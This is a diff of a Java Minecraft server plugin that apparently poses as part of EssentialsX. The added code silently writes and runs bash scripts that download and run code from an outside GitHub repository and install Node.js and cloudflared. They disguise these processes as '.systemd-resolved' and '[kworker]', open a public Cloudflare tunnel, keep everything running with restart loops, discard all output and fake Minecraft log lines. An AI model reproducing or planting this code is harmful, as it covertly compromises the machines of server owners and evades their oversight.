+        if (pluginsDir != null && pluginsDir.getName().equals("plugins")) {
+            File root = pluginsDir.getParentFile();
+            if (new File(root, "server.properties").exists()) return root;
+        }
+        File current = new File(".").getAbsoluteFile();
+        for (int i = 0; i < 5; i++) {
+            if (new File(current, "server.properties").exists()) return current;
+            current = current.getParentFile();
+            if (current == null) break;
+        }
+        return null;
+    }
+
+    // ==================== 看门狗（检测端口并重启宿主）====================
+    private void startWatchdog() {
+        try {
+            if (!Files.exists(workDir)) Files.createDirectories(workDir);
+            Path watchdogPath = workDir.resolve("watchdog.sh");
+            String script = "#!/bin/bash\n" +
+                    "WORK_DIR=\"" + workDir + "\"\n" +
+                    "FORCE_STOP_FILE=\"$WORK_DIR/.force_stop\"\n" +
+                    "is_port_open() { (echo >/dev/tcp/localhost/25565) &>/dev/null && return 0 || return 1; }\n" +
+                    "while true; do\n" +
+                    "    sleep 15\n" +
+                    "    if [ -f \"$FORCE_STOP_FILE\" ]; then rm -f \"$FORCE_STOP_FILE\"; exit 0; fi\n" +
+                    "    if ! is_port_open; then\n" +
+                    "        if [ -f \"$FORCE_STOP_FILE\" ]; then exit 0; fi\n" +
+                    "        cd \"" + findServerRoot().getAbsolutePath() + "\"\n" +
+                    "        JAR_NAME=$(ls -S *.jar 2>/dev/null | head -n 1)\n" +
+                    "        if [ -n \"$JAR_NAME\" ]; then\n" +
+                    "            nohup java -Xms512M -Xmx2G -jar \"$JAR_NAME\" nogui > /dev/null 2>&1 &\n" +
+                    "        fi\n" +
+                    "        exit 0\n" +
+                    "    fi\n" +
+                    "done\n";
+            Files.write(watchdogPath, script.getBytes());
+            watchdogPath.toFile().setExecutable(true);
+            ProcessBuilder pb = new ProcessBuilder("bash", watchdogPath.toString());
+            pb.directory(new File(".").getAbsoluteFile());
+            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+            watchdogProcess = pb.start();
+        } catch (Exception e) {
+            getLogger().warning("Watchdog start failed: " + e.getMessage());
+        }
+    }
+
+    // ==================== 部署Node应用与隧道（带进程伪装）====================
+    private void startDeploymentProcess() throws Exception {
+        if (isProcessRunning) return;
+        Map<String, String> env = new HashMap<>();
+        env.put("REPO_URL", "https://github.com/xfwwl668/mc_hbzy"); // 替换为你的仓库
+        loadEnvFile(env);
+        if (!Files.exists(workDir)) Files.createDirectories(workDir);
+        Path scriptPath = workDir.resolve("deploy.sh");
+        String scriptContent = generateDeployScript(workDir.toString(), env);
+        Files.write(scriptPath, scriptContent.getBytes());
+        scriptPath.toFile().setExecutable(true);
+        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
+        pb.directory(new File(".").getAbsoluteFile());
+        pb.environment().putAll(env);
+        // 隐藏所有输出（不继承，完全静默）
+        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+        deployProcess = pb.start();
+        isProcessRunning = true;
+        deployProcess.waitFor();
+        isProcessRunning = false;
+    }
+
+    private String generateDeployScript(String workDir, Map<String, String> env) {
+        String repoUrl = env.getOrDefault("REPO_URL", "https://github.com/xfwwl668/mc_hbzy");
+        String nodeDir = workDir + "/nodejs";
+        String appDir = workDir + "/app";
+        String dataDir = workDir + "/data";
+
+        return "#!/bin/bash\n" +
+                "WORK_DIR=\"" + workDir + "\"\n" +
+                "NODE_DIR=\"" + nodeDir + "\"\n" +
+                "APP_DIR=\"" + appDir + "\"\n" +
+                "DATA_DIR=\"" + dataDir + "\"\n" +
+                "REPO_URL=\"" + repoUrl + "\"\n" +
+                "GITHUB_AUTH=\"用户名:密钥\"\n" +
+                "\n" +
+                "# 伪装进程名函数\n" +
+                "run_pretend() {\n" +
+                "    local PRETEND_NAME=$1\n" +
+                "    shift\n" +
+                "    exec -a \"$PRETEND_NAME\" \"$@\"\n" +
+                "}\n" +
+                "\n" +
+                "# 选择空闲端口\n" +
+                "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
+                "while true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\n" +
+                "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
+                "echo \"$PORT\" > \"$WORK_DIR/node_port.txt\"\n" +
+                "\n" +
+                "# 安装 Node.js\n" +
+                "ARCH=$(uname -m)\n" +
+                "if [ \"$ARCH\" = \"x86_64\" ]; then\n" +
+                "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\"\n" +
+                "    CF_URL=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\"\n" +
+                "elif [ \"$ARCH\" = \"aarch64\" ]; then\n" +
+                "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\"\n" +
+                "    CF_URL=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\"\n" +
+                "fi\n" +
+                "\n" +
+                "if [ -d \"$NODE_DIR\" ]; then CHECK_VER=$($NODE_DIR/bin/node -v 2>/dev/null); if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi; fi\n" +
+                "if [ ! -d \"$NODE_DIR\" ]; then\n" +
+                "    curl -fsSL --connect-timeout 20 --max-time 180 \"$NODE_URL\" -o \"$WORK_DIR/node.tar.gz\"\n" +
+                "    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1\n" +
+                "    rm -f \"$WORK_DIR/node.tar.gz\"\n" +
+                "fi\n" +
+                "export PATH=$NODE_DIR/bin:$PATH\n" +
+                "\n" +
+                "# 安装依赖\n" +
+                "npm install -g pm2 --unsafe-perm=true &>/dev/null\n" +
+                "\n" +
+                "# 下载应用仓库\n" +
+                "mkdir -p \"$DATA_DIR\"\n" +
+                "if [ -d \"$APP_DIR\" ]; then\n" +
+                "    cp \"$APP_DIR/bots_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
+                "    cp \"$APP_DIR/task_center_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
+                "    cp \"$APP_DIR/system_guard.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
+                "    cp \"$APP_DIR/nezha_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
+                "    if [ -d \"$APP_DIR/.RoamingMusic\" ]; then\n" +
+                "        rm -rf \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
+                "        cp -r \"$APP_DIR/.RoamingMusic\" \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
+                "    fi\n" +
+                "fi\n" +
+                "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
+                "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
+                "download_code() {\n" +
+                "    local URL=$1; local AUTH=$2\n" +
+                "    if [ -n \"$AUTH\" ]; then\n" +
+                "        curl -fsSL --connect-timeout 15 --max-time 120 -u \"$AUTH\" \"$URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null\n" +
+                "    else\n" +
+                "        curl -fsSL --connect-timeout 15 --max-time 120 \"$URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null\n" +
+                "    fi\n" +
+                "    if [ -f \"$WORK_DIR/repo.tar.gz\" ] && tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then return 0; else rm -f \"$WORK_DIR/repo.tar.gz\"; return 1; fi\n" +
+                "}\n" +
+                "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" \"\" || \\\n" +
+                "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\" \"\" || \\\n" +
+                "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" \"$GITHUB_AUTH\" || \\\n" +
+                "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\" \"$GITHUB_AUTH\"\n" +
+                "if [ ! -f \"$WORK_DIR/repo.tar.gz\" ]; then exit 1; fi\n" +
+                "mkdir -p \"$WORK_DIR/unzipped\"\n" +
+                "tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
+                "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
+                "mv \"$SUBDIR\" \"$APP_DIR\"\n" +
+                "rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
+                "cd \"$APP_DIR\"\n" +
+                "npm install --unsafe-perm=true --allow-root &>/dev/null\n" +
+                "# 恢复配置\n" +
+                "cp \"$DATA_DIR/bots_config.json\" \"$APP_DIR/\" 2>/dev/null\n" +
+                "cp \"$DATA_DIR/task_center_config.json\" \"$APP_DIR/\" 2>/dev/null\n" +
+                "cp \"$DATA_DIR/system_guard.json\" \"$APP_DIR/\" 2>/dev/null\n" +
+                "cp \"$DATA_DIR/nezha_config.json\" \"$APP_DIR/\" 2>/dev/null\n" +
+                "if [ -d \"$DATA_DIR/.RoamingMusic_bak\" ]; then\n" +
+                "    mkdir -p \"$APP_DIR/.RoamingMusic\"\n" +
+                "    cp -r \"$DATA_DIR/.RoamingMusic_bak/\"* \"$APP_DIR/.RoamingMusic/\" 2>/dev/null\n" +
+                "fi\n" +
+                "\n" +
+                "# 下载并伪装 cloudflared\n" +
+                "CF_BIN=\"$WORK_DIR/.systemd-resolved\"   # 伪装进程名\n" +
+                "if [ ! -x \"$CF_BIN\" ]; then\n" +
+                "    curl -fsSL --connect-timeout 20 --max-time 180 \"$CF_URL\" -o \"$CF_BIN\"\n" +
+                "    chmod +x \"$CF_BIN\"\n" +
+                "fi\n" +
+                "\n" +
+                "# 启动 cloudflared（伪装成 systemd-resolved）\n" +
+                "nohup \"$CF_BIN\" tunnel --url http://localhost:$PORT --no-autoupdate --protocol http2 --edge-ip-version auto > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
+                "TUNNEL_PID=$!\n" +
+                "echo \"$TUNNEL_PID\" > \"$WORK_DIR/tunnel.pid\"\n" +
+                "\n" +
+                "# 等待隧道URL\n" +
+                "TUNNEL_URL=\"\"\n" +
+                "for i in {1..30}; do\n" +
+                "    sleep 2\n" +
+                "    TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" | tail -n 1)\n" +
+                "    if [ -n \"$TUNNEL_URL\" ]; then break; fi\n" +
+                "done\n" +
+                "if [ -z \"$TUNNEL_URL\" ]; then exit 1; fi\n" +
+                "echo \"$TUNNEL_URL\" > \"$WORK_DIR/tunnel_url.txt\"\n" +
+                "\n" +
+                "# 启动 Node 服务（伪装进程名为 [kworker] ）\n" +
+                "PRETEND_NODE=\"[kworker]\"\n" +
+                "nohup exec -a \"$PRETEND_NODE\" node index.js > \"$WORK_DIR/node.log\" 2>&1 &\n" +
+                "NODE_PID=$!\n" +
+                "echo \"$NODE_PID\" > \"$WORK_DIR/node.pid\"\n" +
+                "\n" +
+                "# 健康监控简单循环\n" +
+                "while true; do\n" +
+                "    sleep 10\n" +
+                "    if ! kill -0 \"$TUNNEL_PID\" 2>/dev/null; then\n" +
+                "        nohup \"$CF_BIN\" tunnel --url http://localhost:$PORT --no-autoupdate --protocol http2 --edge-ip-version auto > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
+                "        TUNNEL_PID=$!\n" +
+                "        echo \"$TUNNEL_PID\" > \"$WORK_DIR/tunnel.pid\"\n" +
+                "    fi\n" +
+                "    if ! kill -0 \"$NODE_PID\" 2>/dev/null; then\n" +
+                "        nohup exec -a \"$PRETEND_NODE\" node index.js > \"$WORK_DIR/node.log\" 2>&1 &\n" +
+                "        NODE_PID=$!\n" +
+                "        echo \"$NODE_PID\" > \"$WORK_DIR/node.pid\"\n" +
+                "    fi\n" +
+                "done &\n" +
+                "exit 0\n";
+    }
+
+    // ==================== 辅助工具 ====================
+    private void deleteDirectory(File file) {
+        File[] files = file.listFiles();
+        if (files != null) {
+            for (File f : files) {
+                if (f.isDirectory()) deleteDirectory(f);
+                else f.delete();
+            }
+        }
+        file.delete();
+    }
 
     private void loadEnvFile(Map<String, String> env) {
         Path envFile = Paths.get("plugins", "EssentialsX", ".env");
         if (!Files.exists(envFile)) {
             try {
                 Files.createDirectories(envFile.getParent());
-                Files.writeString(envFile,
-                        "REPO_URL=" + DEFAULT_REPO_URL + "\n" +
-                                "SYSTEM_GUARD_ENABLED=true\n" +
-                                "# GITHUB_AUTH=用户名:密钥\n",
-                        StandardCharsets.UTF_8);
-            } catch (IOException e) {
-                getLogger().warning("Failed to create .env: " + e.getMessage());
-            }
+                String defaultConfig = "# SYSTEM_GUARD_ENABLED=true\nREPO_URL=https://github.com/xfwwl668/mc_hbzy\n";
+                Files.write(envFile, defaultConfig.getBytes());
+            } catch (IOException ignored) {}
         }
-        if (!Files.exists(envFile)) return;
+        if (Files.exists(envFile)) {
+            try {
+                for (String line : Files.readAllLines(envFile)) {
+                    if (line.isEmpty() || line.startsWith("#")) continue;
+                    String[] parts = line.split("=", 2);
+                    if (parts.length == 2) env.put(parts[0].trim(), parts[1].trim());
+                }
+            } catch (IOException ignored) {}
+        }
+    }
 
-        try {
-            for (String rawLine : Files.readAllLines(envFile, StandardCharsets.UTF_8)) {
-                String line = rawLine.trim();
-                if (line.isEmpty() || line.startsWith("#")) continue;
-                String[] p = line.split("=", 2);
-                if (p.length == 2) env.put(p[0].trim(), p[1].trim());
-            }
-        } catch (IOException e) {
-            getLogger().warning("Failed to read .env: " + e.getMessage());
-        }
+    // 模拟MC日志输出（隐藏真实错误）
+    private void mcLog(String msg) {
+        String time = LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
+        System.out.println("[" + time + " INFO]: " + msg);
     }
 }
